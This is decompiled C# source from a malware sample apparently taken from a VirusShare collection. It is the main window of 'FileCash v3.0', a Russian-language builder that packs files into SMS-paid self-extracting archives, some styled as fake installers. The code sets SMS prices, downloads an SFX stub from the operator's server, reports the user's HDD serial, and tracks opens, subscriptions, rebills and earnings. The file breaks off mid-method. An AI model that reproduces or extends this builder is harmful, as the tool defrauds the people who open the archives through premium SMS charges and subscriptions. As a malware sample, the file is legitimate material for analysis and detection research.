// Decompiled with JetBrains decompiler
// Type: FileCash_v3._0.Form1
// Assembly: FileCash_v3.0, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 1DECC99D-34C5-4E02-A85D-DC744B5C555A
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00001-msil\Constructor.MSIL.ArchSMS.a-33cc8dceb24ed9df287e1f92d02773477af42b8d2b6de53a45bb9b5a3ead070b.exe

using ComponentAce.Compression.Archiver;
using EnumResNamesCS;
using FileCash_v3._0.Properties;
using HtmlAgilityPack;
using ListViewEmbeddedControls;
using ListViewSorter;
using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Web;
using System.Windows.Forms;
using System.Windows.Forms.Layout;
using System.Xml;

namespace FileCash_v3._0
{
  public class Form1 : Form
  {
    private FileCash FCashObj;
    private ListViewColumnSorter lvwColumnSorter;
    private string news1ID;
    private string news2ID;
    private string news3ID;
    private string UseIcon;
    private string UseImg;
    private bool ProjectSelect;
    private bool OldArchiveChecked;
    private string OldArchiveID;
    private string OldArchivePass;
    private string OldArchiveAntispam;
    private bool TimerError;
    private string balance;
    private string StyeZipName;
    private Dictionary<string, object> WorkerObjHashCode = new Dictionary<string, object>();
    private Dictionary<string, object> ArchiveObjHashCode = new Dictionary<string, object>();
    private Dictionary<string, object> OLDArchiveObjHashCode = new Dictionary<string, object>();
    private Dictionary<string, string> Styles;
    private bool NotyfyShow = true;
    private TimerResoultParam TimerRes = new TimerResoultParam();
    private IContainer components;
    private PictureBox Tab_archivation;
    private PictureBox Tab_addvance;
    private PictureBox Tab_styles;
    private PictureBox Web_enter;
    private Label TXT_LastNews;
    private LinkLabel Link_help;
    private LinkLabel Link_site;
    private LinkLabel Link_forum;
    private LinkLabel Link_about;
    private Label TXT_UpdateInfo;
    private Label TXT_UpdateTime;
    private Label TXT_UpdateInfo2;
    private LinkLabel Link_support;
    private Label TXT_newMsg;
    private LinkLabel Link_NewMsgCount;
    private Label label1;
    private Label LoginTXT;
    private Label label3;
    private Label BalanceSum;
    private Label label5;
    private Label label78;
    private Label YesterdaySum;
    private Label TodaySum;
    private Label MonthSum;
    private Label WeekSum;
    private Label label11;
    private Label label12;
    private Panel Tab_archivation_panel;
    private PictureBox pictureBox1;
    private Label label14;
    private Label label13;
    private PictureBox pictureBox4;
    private PictureBox pictureBox3;
    private PictureBox pictureBox2;
    private Label label16;
    private Label label15;
    private Label label21;
    private Label label22;
    private Label label19;
    private Label label20;
    private Label label17;
    private Label label18;
    private PictureBox Tab_archivation_hover;
    private PictureBox Tab_styles_hover;
    private PictureBox Tab_addvance_hover;
    private Panel Menu_archivation;
    private Panel Menu_Project;
    private Panel Menu_Tasks;
    private Panel Menu_archiveList;
    private Panel Tab_styles_panel;
    private Label label23;
    private Label label32;
    private Panel Cont_Main;
    private Panel Tab_addvance_panel;
    private Panel panel7;
    private Label label26;
    private PictureBox pictureBox6;
    private Label label27;
    private Panel Menu_FTP;
    private Label label28;
    private PictureBox pictureBox7;
    private Label label29;
    private Panel Menu_statistic;
    private Label label30;
    private Label label31;
    private PictureBox pictureBox8;
    private Label label33;
    private Label label34;
    private Panel Menu_styleList;
    private Label label35;
    private PictureBox pictureBox9;
    private Label label36;
    private Panel Menu_newstyle;
    private Label label37;
    private Label label38;
    private PictureBox pictureBox10;
    private Label label24;
    private NotifyIcon notifyIcon1;
    private Panel Menu_archivation_cont;
    private ComboBox SelectPaymentType;
    private Label label25;
    private ComboBox SavedProfiles;
    private Label label41;
    private Label label40;
    private Button CreateArchive;
    private Button ClearFiles;
    private Button DeleteFiles;
    private Button AddFiles;
    private ListView ArchivationList;
    private Label label45;
    private Label label47;
    private Label label50;
    private ComboBox SelectArchiveStyle;
    private Label label49;
    private ComboBox SelectFtpConection;
    private CheckBox ShowPriseForClient;
    private CheckBox UseOpenCount;
    private Label label48;
    private Label label46;
    private Label label44;
    private Label label43;
    private TextBox IndicateAltPaymentSum;
    private CheckBox AllowAltPayment;
    private Label label42;
    private ComboBox SelectArchivePrice;
    private Label label39;
    private ColumnHeader F_Name;
    private ColumnHeader F_Size;
    private ColumnHeader F_Sours;
    private Panel Menu_archiveList_cont;
    private Button button6;
    private ListView ArchiveListView;
    private ColumnHeader AID;
    private ColumnHeader ArchiveName;
    private ColumnHeader ArchiveCreated;
    private ColumnHeader ArchivePrice;
    private ColumnHeader AllowSubs;
    private ColumnHeader ArchiveUnpakSum;
    private ColumnHeader Sum;
    private Label label51;
    private Label label60;
    private ContextMenu AddFileMenu;
    private MenuItem AddFile;
    private MenuItem AddFolder;
    private MenuItem RunProject;
    private OpenFileDialog FileAdd_Dialog;
    private FolderBrowserDialog FolderAdd_Dialog;
    private CheckBox UseMyIcon;
    private ComboBox SelectArchiveLangage;
    private Label label52;
    private Panel panel2;
    private Panel panel1;
    private Label news1head;
    private LinkLabel news1txt;
    private LinkLabel news2txt;
    private Label news2head;
    private LinkLabel news3txt;
    private Label news3head;
    private Panel Menu_statistic_cont;
    private ListView StatisticListView;
    private ColumnHeader Date;
    private ColumnHeader Opened;
    private ColumnHeader SMS;
    private ColumnHeader SubsOn;
    private ColumnHeader SubsOff;
    private ColumnHeader Rebils;
    private ColumnHeader RefSum;
    private ColumnHeader Summary;
    private Label label4;
    private System.Windows.Forms.Timer timer1;
    private FlowLayoutPanel flowLayoutPanel1;
    private FlowLayoutPanel flowLayoutPanel2;
    private ImageList imageList;
    private OpenFileDialog ICO_OpenDialog;
    private Panel Menu_Tasks_cont;
    private ListViewEx TaskList;
    private ColumnHeader ArchiveN;
    private ColumnHeader Progress;
    private ColumnHeader Status;
    private Label label2;
    private SaveFileDialog saveFileDialog1;
    private Panel Menu_FTP_cont;
    private ListView FtpList;
    private ColumnHeader FtpName;
    private ColumnHeader FtpServer;
    private ColumnHeader FtpPort;
    private ColumnHeader FtpPath;
    private ColumnHeader FtpLogin;
    private ColumnHeader FtpPass;
    private Label label6;
    private Button DeleteFTP;
    private Button AddFTP;
    private Panel Menu_Project_cont;
    private Button deleteProject;
    private ListViewEx ProjectList;
    private ColumnHeader ProjectName;
    private ColumnHeader ProjectType;
    private Label label7;
    private Panel panel3;
    private Button SaveAsProject;
    private TextBox Project_Name;
    private Label label53;
    private Panel panel4;
    private RadioButton UpdateArchive;
    private RadioButton NewArchive;
    private Panel ForUpdateArchive;
    private Button OldFileBrouse;
    private TextBox OldFilePath;
    private ListView OldFileList;
    private ColumnHeader columnHeader1;
    private ColumnHeader columnHeader2;
    private ColumnHeader columnHeader3;
    private ColumnHeader columnHeader4;
    private ColumnHeader columnHeader5;
    private Label label8;
    private Panel ForNewArch;
    private Button button3;
    private OpenFileDialog OldFileBrouseDialog;
    private BackgroundWorker TimerBackgWorker;
    private OpenFileDialog ImgBrouseDlg;
    private Panel Menu_newstyle_cont;
    private Button StyleTest;
    private ListView StyleList;
    private ColumnHeader columnHeader6;
    private ColumnHeader columnHeader11;
    private ColumnHeader columnHeader12;
    private Label label10;
    private Panel Menu_styleList_cont;
    private ListView StyleListView;
    private ColumnHeader columnHeader14;
    private ColumnHeader columnHeader15;
    private ColumnHeader columnHeader16;
    private Label label55;
    private Button BrowsStyle;
    private Label label56;
    private Label label9;
    private TextBox StylePath;
    private TextBox StyleName;
    private Button StyleCreate;
    private ImageList imageList1;
    private FolderBrowserDialog StyleBrowser;
    private Label inf;
    private ColumnHeader columnHeader7;
    private ColumnHeader Downed;

    public Form1(ref FileCash FC)
    {
      this.FCashObj = FC;
      this.InitializeComponent();
      string input = this.FCashObj.SendPost(this.FCashObj.DomainIP + "/balance.php", "sid=" + this.FCashObj.SID + "&hardware=" + this.FCashObj.HDD_Serial);
      if (input == null)
        return;
      this.LoginTXT.Text = new Regex("login=\"(.*)\",month", RegexOptions.Singleline).Match(input).Groups[1].ToString();
      this.MonthSum.Text = new Regex("month=\"([0-9]*)\",").Match(input).Groups[1].ToString() + " руб.";
      this.TodaySum.Text = new Regex("today=\"([0-9]*)\",").Match(input).Groups[1].ToString() + " руб.";
      this.YesterdaySum.Text = new Regex("yesterday=\"([0-9]*)\",").Match(input).Groups[1].ToString() + " руб.";
      this.WeekSum.Text = new Regex("week=\"([0-9]*)\",").Match(input).Groups[1].ToString() + " руб.";
      this.balance = new Regex("balance=\"([0-9]*)\"").Match(input).Groups[1].ToString();
      this.BalanceSum.Text = this.balance + " руб.";
      string s1 = this.FCashObj.SendPost(this.FCashObj.DomainIP + "/news.php", "sid=" + this.FCashObj.SID + "&hardware=" + this.FCashObj.HDD_Serial);
      if (s1 == null)
        return;
      XmlDocument xmlDocument1 = new XmlDocument();
      MemoryStream memoryStream;
      MemoryStream inStream1 = memoryStream = new MemoryStream(Encoding.UTF8.GetBytes(s1));
      xmlDocument1.Load((Stream) inStream1);
      XmlNodeList elementsByTagName1 = xmlDocument1.GetElementsByTagName("news");
      this.news1head.Text = elementsByTagName1[0].ChildNodes.Item(0).InnerText;
      this.news1txt.Text = elementsByTagName1[0].ChildNodes.Item(1).InnerText;
      this.news1ID = elementsByTagName1[0].ChildNodes.Item(2).InnerText;
      this.news2head.Text = elementsByTagName1[1].ChildNodes.Item(0).InnerText;
      this.news2txt.Text = elementsByTagName1[1].ChildNodes.Item(1).InnerText;
      this.news2ID = elementsByTagName1[1].ChildNodes.Item(2).InnerText;
      this.news3head.Text = elementsByTagName1[2].ChildNodes.Item(0).InnerText;
      this.news3txt.Text = elementsByTagName1[2].ChildNodes.Item(1).InnerText;
      this.news3ID = elementsByTagName1[2].ChildNodes.Item(2).InnerText;
      string s2 = this.FCashObj.SendPost(this.FCashObj.DomainIP + "/get_changes.php", "sid=" + this.FCashObj.SID + "&hardware=" + this.FCashObj.HDD_Serial);
      if (s2.Trim() != "" && s2 != null)
      {
        XmlDocument xmlDocument2 = new XmlDocument();
        MemoryStream inStream2 = memoryStream = new MemoryStream(Encoding.UTF8.GetBytes(s2));
        xmlDocument2.Load((Stream) inStream2);
        XmlNodeList elementsByTagName2 = xmlDocument2.GetElementsByTagName("res");
        this.TimerRes.oldbalance = this.balance;
        this.TimerRes.opencount = elementsByTagName2[0].ChildNodes.Item(0).InnerText;
        this.TimerRes.unpackcount = elementsByTagName2[0].ChildNodes.Item(1).InnerText;
        this.TimerRes.unpacksum = elementsByTagName2[0].ChildNodes.Item(2).InnerText;
        this.TimerRes.subs = elementsByTagName2[0].ChildNodes.Item(3).InnerText;
        this.TimerRes.offsubs = elementsByTagName2[0].ChildNodes.Item(4).InnerText;
        this.TimerRes.mtrebils = elementsByTagName2[0].ChildNodes.Item(5).InnerText;
        this.TimerRes.mtrebilsSum = elementsByTagName2[0].ChildNodes.Item(6).InnerText;
        xmlDocument2.Clone();
      }
      this.showftp();
      this.showprofiles();
      this.LoadProjectList();
      this.Tab_archivation_panel.Location = new Point(0, 0);
      this.Tab_archivation_panel.Visible = true;
      this.Tab_archivation_panel.Width = 516;
      this.Tab_archivation_panel.Height = 424;
      this.ForNewArch.Location = new Point(2, 70);
      this.ForNewArch.Width = 506;
      this.ForNewArch.Height = 135;
      this.SelectArchivePrice.SelectedItem = (object) "150 руб.";
      this.SelectArchiveLangage.SelectedItem = (object) "Русский";
      this.SelectPaymentType.SelectedItem = (object) "Оплата СМС";
      Form1.SetWindowTheme(this.ArchivationList.Handle, "explorer", (string) null);
      Form1.SetWindowTheme(this.ArchiveListView.Handle, "explorer", (string) null);
      this.lvwColumnSorter = new ListViewColumnSorter();
      this.ArchiveListView.ListViewItemSorter = (IComparer) this.lvwColumnSorter;
      Form1.SetWindowTheme(this.StatisticListView.Handle, "explorer", (string) null);
      Form1.SetWindowTheme(this.TaskList.Handle, "explorer", (string) null);
      Form1.SetWindowTheme(this.FtpList.Handle, "explorer", (string) null);
      Form1.SetWindowTheme(this.OldFileList.Handle, "explorer", (string) null);
      Form1.SetWindowTheme(this.ProjectList.Handle, "explorer", (string) null);
      Form1.SetWindowTheme(this.StyleList.Handle, "explorer", (string) null);
    }

    [DllImport("uxtheme.dll", CharSet = CharSet.Unicode)]
    private static extern int SetWindowTheme(IntPtr hWnd, string appName, string partList);

    private void LoadProjectList()
    {
      if (!System.IO.File.Exists(this.FCashObj.SavedProjectPath))
        return;
      XmlDocument xmlDocument = new XmlDocument();
      xmlDocument.Load(this.FCashObj.SavedProjectPath);
      XmlNodeList elementsByTagName = xmlDocument.GetElementsByTagName("project");
      this.AddFileMenu.MenuItems[2].MenuItems.Clear();
      this.ProjectList.Items.Clear();
      for (int i = 0; i < elementsByTagName.Count; ++i)
      {
        ListViewItem listViewItem = new ListViewItem(elementsByTagName[i].Attributes[0].InnerText);
        if (elementsByTagName[i].SelectSingleNode("type").InnerText == "0")
          listViewItem.SubItems.Add("Новый");
        else
          listViewItem.SubItems.Add("Обновление");
        this.ProjectList.Items.Add(listViewItem);
        MenuItem menuItem = new MenuItem();
        menuItem.Index = i;
        menuItem.Text = elementsByTagName[i].Attributes[0].InnerText;
        menuItem.Click += new EventHandler(this.menuItem_Click);
        this.AddFileMenu.MenuItems[2].MenuItems.Add(menuItem);
      }
    }

    private void Tab_Click(object sender, EventArgs e)
    {
      string[] strArray = new string[3]
      {
        "Tab_archivation",
        "Tab_styles",
        "Tab_addvance"
      };
      foreach (string key in strArray)
      {
        if (key != ((Control) sender).Name.Replace("_hover", ""))
        {
          (this.Controls[key] as PictureBox).Visible = true;
          (this.Controls[key + "_hover"] as PictureBox).Visible = false;
        }
      }
      (this.Controls[((Control) sender).Name.Replace("_hover", "") + "_hover"] as PictureBox).Visible = true;
      Panel control1 = this.Cont_Main.Controls[((Control) sender).Name.Replace("_hover", "") + "_panel"] as Panel;
      control1.Visible = true;
      control1.Location = new Point(0, 0);
      control1.Width = 516;
      control1.Height = 424;
      foreach (Control control2 in (ArrangedElementCollection) this.Cont_Main.Controls)
      {
        if (control2.GetType().ToString() == "System.Windows.Forms.Panel" && control2.Name != ((Control) sender).Name.Replace("_hover", "") + "_panel")
          control2.Visible = false;
      }
      if (((Control) sender).Name.IndexOf("_hover") != 0)
        return;
      ((Control) sender).Visible = false;
    }

    private void Panel_MouseEnter(object sender, EventArgs e)
    {
      Control control1 = new Control();
      Control control2 = new Control();
      Control control3;
      Control parent;
      if (sender.GetType().ToString() != "System.Windows.Forms.Panel")
      {
        control3 = ((Control) sender).Parent;
        parent = ((Control) sender).Parent.Parent;
      }
      else
      {
        control3 = (Control) sender;
        parent = ((Control) sender).Parent;
      }
      if (control3.BackgroundImage == null)
        control3.BackgroundImage = (Image) Resources.screen4_03;
      foreach (Control control4 in (ArrangedElementCollection) parent.Controls)
      {
        if (control4.GetType().ToString() == "System.Windows.Forms.Panel" && control4.Name != control3.Name)
          control4.BackgroundImage = (Image) null;
      }
    }

    private void MainPanel_MouseEnter(object sender, EventArgs e)
    {
      foreach (Control control in (ArrangedElementCollection) ((Control) sender).Controls)
      {
        if (control.GetType().ToString() == "System.Windows.Forms.Panel")
          control.BackgroundImage = (Image) null;
      }
    }

    private void Form1_Resize(object sender, EventArgs e)
    {
      if (FormWindowState.Minimized == this.WindowState)
      {
        this.notifyIcon1.Visible = true;
        this.Hide();
      }
      else
      {
        if (this.WindowState != FormWindowState.Normal)
          return;
        this.notifyIcon1.Visible = false;
      }
    }

    private void notifyIcon1_MouseDoubleClick(object sender, EventArgs e)
    {
      this.Show();
      this.WindowState = FormWindowState.Normal;
    }

    private void Menu_Click(object sender, EventArgs e)
    {
      string key = (object) sender.GetType() == (object) typeof (Panel) ? ((Control) sender).Name + "_cont" : ((Control) sender).Parent.Name + "_cont";
      Panel control1 = this.Cont_Main.Controls[key] as Panel;
      control1.Visible = true;
      control1.Location = new Point(0, 0);
      control1.Width = 516;
      control1.Height = 424;
      foreach (Control control2 in (ArrangedElementCollection) this.Cont_Main.Controls)
      {
        if (control2.GetType().ToString() == "System.Windows.Forms.Panel" && control2.Name != key)
          control2.Visible = false;
      }
    }

    private void AddFiles_Click(object sender, EventArgs e) => this.AddFileMenu.Show(sender as Control, new Point(0, 23));

    private void AddFile_Click(object sender, EventArgs e)
    {
      int num = (int) this.FileAdd_Dialog.ShowDialog();
    }

    private void FileAdd_Dialog_FileOk(object sender, CancelEventArgs e)
    {
      FileInfo fileInfo = new FileInfo(this.FileAdd_Dialog.FileName);
      this.ArchivationList.Items.Add(new ListViewItem(fileInfo.Name, 1)
      {
        SubItems = {
          fileInfo.Length.ToString(),
          this.FileAdd_Dialog.FileName.ToString()
        }
      });
    }

    private void AddFolder_Click(object sender, EventArgs e)
    {
      if (this.FolderAdd_Dialog.ShowDialog() != DialogResult.OK)
        return;
      string[] strArray = this.FolderAdd_Dialog.SelectedPath.Split('\\');
      this.ArchivationList.Items.Add(new ListViewItem(strArray[strArray.Length - 1], 0)
      {
        SubItems = {
          "-",
          this.FolderAdd_Dialog.SelectedPath
        }
      });
    }

    private void ClearFiles_Click(object sender, EventArgs e) => this.ArchivationList.Items.Clear();

    private void comboBox_DrawItem(object sender, DrawItemEventArgs e)
    {
      if (e.Index < 0)
        return;
      e.DrawBackground();
      Brush black1 = Brushes.Black;
      Brush black2 = Brushes.Black;
      e.Graphics.DrawString(((ComboBox) sender).Items[e.Index].ToString(), e.Font, black2, (RectangleF) e.Bounds, StringFormat.GenericDefault);
      e.DrawFocusRectangle();
    }

    private void Form1_FormClosed(object sender, FormClosedEventArgs e)
    {
      this.notifyIcon1.Visible = false;
      Application.Exit();
    }

    private void Menu_archiveList_cont_VisibleChanged(object sender, EventArgs e)
    {
      if (!((Control) sender).Visible)
        return;
      string s = this.FCashObj.SendPost(this.FCashObj.DomainIP + "/archives_list.php", "sid=" + this.FCashObj.SID + "&hardware=" + this.FCashObj.HDD_Serial);
      if (s == null)
        return;
      XmlDocument xmlDocument = new XmlDocument();
      MemoryStream memoryStream;
      MemoryStream inStream = memoryStream = new MemoryStream(Encoding.UTF8.GetBytes(s));
      xmlDocument.Load((Stream) inStream);
      XmlNodeList elementsByTagName = xmlDocument.GetElementsByTagName("arh");
      this.ArchiveListView.Items.Clear();
      for (int i = 0; i < elementsByTagName.Count; ++i)
        this.ArchiveListView.Items.Add(new ListViewItem(elementsByTagName[i].ChildNodes.Item(0).InnerText)
        {
          SubItems = {
            elementsByTagName[i].ChildNodes.Item(1).InnerText,
            elementsByTagName[i].ChildNodes.Item(2).InnerText,
            elementsByTagName[i].ChildNodes.Item(3).InnerText,
            elementsByTagName[i].ChildNodes.Item(4).InnerText,
            elementsByTagName[i].ChildNodes.Item(5).InnerText,
            elementsByTagName[i].ChildNodes.Item(6).InnerText
          }
        });
    }

    private void ArchiveListView_ColumnClick(object sender, ColumnClickEventArgs e)
    {
      if (e.Column == this.lvwColumnSorter.SortColumn)
      {
        this.lvwColumnSorter.Order = this.lvwColumnSorter.Order != SortOrder.Ascending ? SortOrder.Ascending : SortOrder.Descending;
      }
      else
      {
        this.lvwColumnSorter.SortColumn = e.Column;
        this.lvwColumnSorter.Order = SortOrder.Ascending;
      }
      this.ArchiveListView.Sort();
    }

    private void Menu_statistic_cont_VisibleChanged(object sender, EventArgs e)
    {
      if (!((Control) sender).Visible)
        return;
      string s = this.FCashObj.SendPost(this.FCashObj.DomainIP + "/stat.php", "sid=" + this.FCashObj.SID + "&hardware=" + this.FCashObj.HDD_Serial);
      if (s == null)
        return;
      XmlDocument xmlDocument = new XmlDocument();
      MemoryStream memoryStream;
      MemoryStream inStream = memoryStream = new MemoryStream(Encoding.UTF8.GetBytes(s));
      xmlDocument.Load((Stream) inStream);
      XmlNodeList elementsByTagName = xmlDocument.GetElementsByTagName("stat");
      this.StatisticListView.Items.Clear();
      for (int i = 0; i < elementsByTagName.Count; ++i)
        this.StatisticListView.Items.Add(new ListViewItem(elementsByTagName[i].ChildNodes.Item(0).InnerText)
        {
          SubItems = {
            elementsByTagName[i].ChildNodes.Item(1).InnerText,
            elementsByTagName[i].ChildNodes.Item(2).InnerText,
            elementsByTagName[i].ChildNodes.Item(3).InnerText,
            elementsByTagName[i].ChildNodes.Item(4).InnerText,
            elementsByTagName[i].ChildNodes.Item(5).InnerText,
            elementsByTagName[i].ChildNodes.Item(6).InnerText,
            elementsByTagName[i].ChildNodes.Item(7).InnerText,
            elementsByTagName[i].ChildNodes.Item(8).InnerText
          }
        });
    }

    private void DeleteFiles_Click(object sender, EventArgs e)
    {
      foreach (ListViewItem selectedItem in this.ArchivationList.SelectedItems)
        this.ArchivationList.Items.Remove(selectedItem);
    }

    private string[] CheckArchivationParams(int type)
    {
      string caption;
      switch (type)
      {
        case 0:
          caption = "Ошибка архивации";
          break;
        case 2:
          caption = "Ошибка обновления архива";
          break;
        default:
          caption = "Ошибка создания проекта";
          break;
      }
      string[] strArray = new string[this.ArchivationList.Items.Count];
      int index = 0;
      if (type == 2)
      {
        if (!System.IO.File.Exists(this.OldFilePath.Text))
        {
          int num = (int) MessageBox.Show("Не найден архив-источник! ", caption, MessageBoxButtons.OK, MessageBoxIcon.Hand);
          return (string[]) null;
        }
        if (this.OldArchiveChecked)
          strArray = new string[1]{ this.OldFilePath.Text };
      }
      if (this.ArchivationList.Items.Count == 0 && type != 2)
      {
        int num = (int) MessageBox.Show("Список файлов пуст!", caption, MessageBoxButtons.OK, MessageBoxIcon.Hand);
        return (string[]) null;
      }
      if (type != 2)
      {
        foreach (ListViewItem listViewItem in this.ArchivationList.Items)
        {
          if (Directory.Exists(listViewItem.SubItems[2].Text) || System.IO.File.Exists(listViewItem.SubItems[2].Text))
          {
            strArray[index] = listViewItem.SubItems[2].Text;
            ++index;
          }
          else
          {
            int num = (int) MessageBox.Show("Не правильный путь! \n" + listViewItem.SubItems[2].Text, caption, MessageBoxButtons.OK, MessageBoxIcon.Hand);
            return (string[]) null;
          }
        }
      }
      if (this.AllowAltPayment.Checked)
      {
        if (this.IndicateAltPaymentSum.Text == "")
        {
          int num = (int) MessageBox.Show("Укажите сумму алтернативной оплаты! ", caption, MessageBoxButtons.OK, MessageBoxIcon.Hand);
          this.IndicateAltPaymentSum.Focus();
          return (string[]) null;
        }
        if (Convert.ToInt32(this.IndicateAltPaymentSum.Text) < 30)
        {
          int num = (int) MessageBox.Show("Минимальная сумма алтернативной оплаты 30 руб! ", caption, MessageBoxButtons.OK, MessageBoxIcon.Hand);
          return (string[]) null;
        }
        if (Convert.ToInt32(this.IndicateAltPaymentSum.Text) > Convert.ToInt32(new Regex("([0-9]{2,3})").Match(this.SelectArchivePrice.SelectedItem.ToString()).Groups[1].ToString()))
        {
          int num = (int) MessageBox.Show("Максимальная сумма алтернативной оплаты, должна быть не больше выбранной суммы смс! ", caption, MessageBoxButtons.OK, MessageBoxIcon.Hand);
          this.IndicateAltPaymentSum.Focus();
          return (string[]) null;
        }
      }
      return strArray;
    }

    private void CreateArchive_Click(object sender, EventArgs e)
    {
      string[] strArray;
      if (!this.UpdateArchive.Checked)
      {
        strArray = this.CheckArchivationParams(0);
        if (strArray == null)
          return;
      }
      else
      {
        strArray = this.CheckArchivationParams(2);
        if (strArray == null)
          return;
      }
      PreparingArchivationParams archivationParams = new PreparingArchivationParams();
      if (this.saveFileDialog1.ShowDialog() == DialogResult.OK)
      {
        archivationParams.ArchiveName = this.saveFileDialog1.FileName;
        if (this.UpdateArchive.Checked)
        {
          if (!this.OldArchiveChecked || this.OldArchiveID == null)
          {
            int num = (int) MessageBox.Show("Произошла ошибка обновления архива! ", "Ошибка создания проекта", MessageBoxButtons.OK, MessageBoxIcon.Hand);
            return;
          }
          archivationParams.ArchiveID = this.OldArchiveID;
          archivationParams.ArchivePassword = this.OldArchivePass;
          archivationParams.Antispam = this.OldArchiveAntispam;
          archivationParams.ArchivationType = 1;
          this.OldArchiveID = this.OldArchivePass = this.OldArchiveAntispam = (string) null;
        }
        archivationParams.ArchiveList = strArray;
        archivationParams.ArchiveLanguage = this.SelectArchiveLangage.SelectedIndex;
        archivationParams.ArchiveStyle = this.SelectArchiveStyle.SelectedIndex;
        archivationParams.ArchiveStyleName = !(this.SelectArchiveStyle.SelectedItem.ToString() == "Мини") && !(this.SelectArchiveStyle.SelectedItem.ToString() == "Мини 2") && !(this.SelectArchiveStyle.SelectedItem.ToString() == "Инсталлятор") && !(this.SelectArchiveStyle.SelectedItem.ToString() == "Инсталлятор модерн") && !(this.SelectArchiveStyle.SelectedItem.ToString() == "Стандартный") || archivationParams.ArchiveLanguage != 1 ? this.Styles[this.SelectArchiveStyle.SelectedItem.ToString()] : this.Styles[this.SelectArchiveStyle.SelectedItem.ToString()] + "_en";
        archivationParams.MyIconPath = this.UseIcon;
        archivationParams.MyPicturePath = this.UseImg;
        archivationParams.PayType = this.SelectPaymentType.SelectedIndex;
        archivationParams.SMS_Price = this.SelectArchivePrice.SelectedIndex;
        archivationParams.ShowPrice = !this.ShowPriseForClient.Checked ? 0 : 1;
        archivationParams.CalculateOpenCount = !this.UseOpenCount.Checked ? 0 : 1;
        if (this.AllowAltPayment.Checked)
        {
          archivationParams.UseAltPay = 1;
          archivationParams.AltPayCost = Convert.ToInt32(this.IndicateAltPaymentSum.Text);
        }
        else
        {
          archivationParams.UseAltPay = 0;
          archivationParams.AltPayCost = 0;
        }
        archivationParams.FtpConn = this.SelectFtpConection.Text == null ? -1 : this.SelectFtpConection.SelectedIndex;
        bool flag = false;
        if (this.SavedProfiles.Text.Trim() != "")
        {
          for (int index = 0; index < this.SavedProfiles.Items.Count; ++index)
          {
            if (this.SavedProfiles.Text == this.SavedProfiles.Items[index].ToString())
            {
              flag = true;
              break;
            }
          }
          if (!flag)
          {
            if (!Directory.Exists(this.FCashObj.LocalTmpPath))
              Directory.CreateDirectory(this.FCashObj.LocalTmpPath);
            if (!System.IO.File.Exists(this.FCashObj.SavedProfilePath))
            {
              FileStream fileStream = System.IO.File.Open(this.FCashObj.SavedProfilePath, FileMode.OpenOrCreate, FileAccess.ReadWrite);
              StreamWriter streamWriter = new StreamWriter((Stream) fileStream, Encoding.UTF8);
              streamWriter.WriteLine("<all_profile>");
              streamWriter.Flush();
              streamWriter.WriteLine("</all_profile>");
              streamWriter.Flush();
              streamWriter.Close();
              fileStream.Dispose();
              fileStream.Close();
            }
            string str = "<profile>" + "<name>" + this.SavedProfiles.Text + "</name>" + "<paytype>" + (object) archivationParams.PayType + "</paytype>" + "<smsprice>" + (object) archivationParams.SMS_Price + "</smsprice>" + "<altpaycost>" + (object) archivationParams.AltPayCost + "</altpaycost>" + "<style>" + (object) archivationParams.ArchiveStyle + "</style>" + "<language>" + (object) archivationParams.ArchiveLanguage + "</language>" + "<open>" + (object) archivationParams.CalculateOpenCount + "</open>" + "<showprice>" + (object) archivationParams.ShowPrice + "</showprice>" + "</profile>";
            XmlDocument xmlDocument1;
            XmlDocument xmlDocument2 = xmlDocument1 = new XmlDocument();
            xmlDocument2.Load(this.FCashObj.SavedProfilePath);
            XmlDocumentFragment documentFragment = xmlDocument2.CreateDocumentFragment();
            documentFragment.InnerXml = str;
            xmlDocument2.DocumentElement.AppendChild((XmlNode) documentFragment);
            FileStream outStream = new FileStream(this.FCashObj.SavedProfilePath, FileMode.Truncate, FileAccess.Write, FileShare.ReadWrite);
            if (this.SavedProfiles.Text != null)
              xmlDocument2.Save((Stream) outStream);
            outStream.Close();
            this.showprofiles();
          }
        }
        BackgroundWorker backgroundWorker = new BackgroundWorker();
        backgroundWorker.WorkerReportsProgress = true;
        backgroundWorker.WorkerSupportsCancellation = true;
        backgroundWorker.DoWork += new DoWorkEventHandler(this.backgroundWorker_DoWork);
        backgroundWorker.ProgressChanged += new ProgressChangedEventHandler(this.backgroundWorker_ProgressChanged);
        backgroundWorker.RunWorkerCompleted += new RunWorkerCompletedEventHandler(this.backgroundWorker_RunWorkerCompleted);
        archivationParams.Worker = (object) backgroundWorker;
        backgroundWorker.RunWorkerAsync((object) archivationParams);
        this.ClearArchivationWindow();
      }
      else
      {
        int num1 = (int) MessageBox.Show("Укажите имя архива! ", "Ошибка архивации", MessageBoxButtons.OK, MessageBoxIcon.Hand);
      }
    }

    private int GetFileCount(string path)
    {
      int fileCount = 0;
      if (System.IO.File.Exists(path))
        ++fileCount;
      else if (Directory.Exists(path))
      {
        fileCount += Directory.GetFiles(path).Length;
        foreach (string directory in Directory.GetDirectories(path))
          fileCount += this.GetFileCount(directory);
      }
      return fileCount;
    }

    private void backgroundWorker_DoWork(object sender, DoWorkEventArgs e)
    {
      PreparingArchivationParams userState = e.Argument as PreparingArchivationParams;
      string str1 = new Random().Next(10000000, 999999999).ToString();
      userState.TmpName = userState.TmpName + "\\" + str1 + ".exe";
      userState.TmpStyle = userState.TmpStyle + "\\" + str1 + ".zip";
      BackgroundWorker backgroundWorker = sender as BackgroundWorker;
      ProgressBar progressBar = new ProgressBar();
      progressBar.Location = new Point(0, 0);
      progressBar.Name = "progressBar";
      progressBar.Size = new Size(100, 23);
      progressBar.Step = 1;
      this.WorkerObjHashCode[backgroundWorker.GetHashCode().ToString()] = (object) userState;
      userState.PBar = (object) progressBar;
      string[] strArray = userState.ArchiveName.Split('\\');
      backgroundWorker.ReportProgress(-1, (object) userState);
      try
      {
        WebClient webClient = new WebClient();
        webClient.DownloadFile(this.FCashObj.DomainIP.Replace("/_arch_api", "") + "/sfx_mods/default.sfx", userState.TmpName);
        do
          ;
        while (webClient.IsBusy);
        webClient.Dispose();
      }
      catch
      {
        userState.ErrorN = true;
        int num = (int) MessageBox.Show("Ошибка:[1527] Произошла ошибка при создании архива " + strArray[strArray.Length - 1] + " !", "Ошибка архивации", MessageBoxButtons.OK, MessageBoxIcon.Hand);
        backgroundWorker.CancelAsync();
        return;
      }
      try
      {
